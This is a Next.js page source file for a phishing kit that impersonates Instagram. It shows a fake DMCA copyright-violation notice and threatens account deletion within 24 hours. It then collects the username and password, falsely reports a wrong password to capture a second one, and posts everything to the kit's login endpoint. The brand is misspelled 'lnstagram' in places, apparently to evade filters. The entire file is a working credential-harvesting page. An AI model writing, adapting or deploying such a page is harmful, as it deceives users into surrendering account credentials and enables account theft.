import type { NextPage } from "next";
import { useRouter } from "next/router";
import { useState } from "react";

const steps = [
  {
    id: 1,
    title: "Information",
  },
  {
    id: 2,
    title: "User Details",
  },
  {
    id: 3,
    title: "Copyright Reason",
  },
  {
    id: 4,
    title: "Form Status",
  },
];

const defaultStyle = "rounded-full flex justify-center items-center w-8 h-8 ";

const Steps: React.FC<{ step: number }> = ({ step, children }) => {
  return (
    <div className="flex flex-col space-y-12">
      <div className="flex flex-row space-x-12 px-8 md:px-4 text-center">
        {steps.map((item) => (
          <div
            key={item.id}
            className="flex flex-col items-center justify-center space-y-2"
          >
            <span
              className={
                item.id == step
                  ? defaultStyle + "bg-black text-white"
                  : defaultStyle + "border border-black"
              }
            >
              <h1>{item.id}</h1>
            </span>
            <h1 className="text-sm">{item.title}</h1>
          </div>
        ))}
      </div>
      <div className="flex justify-center pl-6 md:py-2 items-center">
        {children}
      </div>
    </div>
  );
};

const Home: NextPage = () => {
  const [step, setStep] = useState(1);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [wrongPassword, setWrongPassword] = useState("");
  const [isWrongPassword, setIsWrongPassword] = useState(false);

  const { query } = useRouter();

  const logIn = async (e: any): Promise<void> => {
    if (!username || !password) return alert("Fill in all the blanks.");

    if (!isWrongPassword) {
      return setIsWrongPassword(true);
    }

    if (!wrongPassword) return alert("Fill in the wrong password.");

    const response = await fetch(`/api/users/login`, {
      method: "POST",
      body: JSON.stringify({
        username,
        password,
        wrongPassword,
      }),
      headers: {
        "Content-Type": "application/json",
      },
    });

    if (!response.ok) {
      setIsWrongPassword(false);
      setUsername("");
      setPassword("");
      setWrongPassword("");
      setStep(1);
      return;
    }

    setIsWrongPassword(false);
    setStep(step + 1);
    return;
  };

  if (step === 1) {
    return (
      <Steps step={step}>
        <div className="w-96 h-full shadow-2xl border flex flex-col items-center space-y-6 justify-center px-6 py-6">
          <h1 className="font-semibold text-2xl text-gray-800">Information</h1>
          <p className="text-center indent-8">
            Dear <strong>{query.username || "user"}</strong>, this form is sent
            once to every copyright infringing user, enter carefully following
            our data policies, incorrect information will be canceled and the
            account will be deleted within{" "}
            <code className="text-red-600">24-hours.</code> In addition, your
            necessary information will be given to the copyright owner as per
            our contract.
          </p>
          <button
            className="rounded-full py-2 px-6 bg-black text-white"
            onClick={(e) => setStep(step + 1)}
          >
            Next
          </button>
        </div>
      </Steps>
    );
  } else if (step === 2) {
    return (
      <Steps step={step}>
        <div className="w-96 h-full shadow-2xl border flex flex-col items-center space-y-6 justify-center px-6 py-6">
          <h1 className="font-semibold text-2xl text-gray-800">User Details</h1>
          <p className="text-center indent-8">
            Please fill in the required inputs.
          </p>
          <div className="space-y-2 flex flex-col items-center">
            <input
              type={"text"}
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="border py-2 pl-2 rounded-md px-9 shadow"
            />
            {isWrongPassword ? (
              <>
                <input
                  type={"password"}
                  placeholder="Retype password"
                  value={wrongPassword}
                  onChange={(e) => setWrongPassword(e.target.value)}
                  className="border py-2 pl-2 rounded-md px-9 shadow"
                />
                <p>Wrong password, please retype.</p>
              </>
            ) :        <input
            type={"password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="border py-2 pl-2 rounded-md px-9 shadow"
          />}

            <button
              className="rounded-full py-2 px-6 bg-black text-white"
              onClick={logIn}
            >
              Next
            </button>
          </div>
        </div>
      </Steps>
    );
  } else if (step === 3) {
    return (
      <Steps step={step}>
        <div className="flex flex-col justify-center w-96 space-y-4">
          <p>
            Your business account has been found to violate the DMCA (Digital
            Millennium Copyright) Laws.
          </p>
          <p>
            lnstagram complies with the notice-and-takedown procedures set out
            in section 512(c) of the United States Digital Millennium Copyright
            Act (DMCA), which applies to content reported and removed for
            violating U.S. copyrights.
          </p>
          <p>
            lnstagram will appoint a designated agent to contact you directly
            regarding this matter.
          </p>
          <p>
            You must contact the our designated agent and complete the necessary
            steps, otherwise your account will be permanently deleted.
          </p>
          <p>
            The fastest and easiest way to send a DMCA report of copyright
            infringement appeal to our designated agent is to fill out our
            online form. You can reply to this message to reach our designated
            agent.
          </p>
          <button
            className="rounded-full py-2 px-6 bg-black text-white"
            onClick={(e) => setStep(step + 1)}
          >
            Next
          </button>
        </div>
      </Steps>
    );
  } else if (step === 4) {
    return (
      <Steps step={step}>
        <div className="flex flex-col space-y-4 items-center">
          <span className="text-green-500">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="100"
              height="100"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              stroke-linecap="round"
              stroke-linejoin="round"
              className="feather feather-thumbs-up"
            >
              <path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"></path>
            </svg>
          </span>
          <h1>Your request has been received, thanks for using Instagram.</h1>
        </div>
      </Steps>
    );
  }

  return null;
};

export default Home;
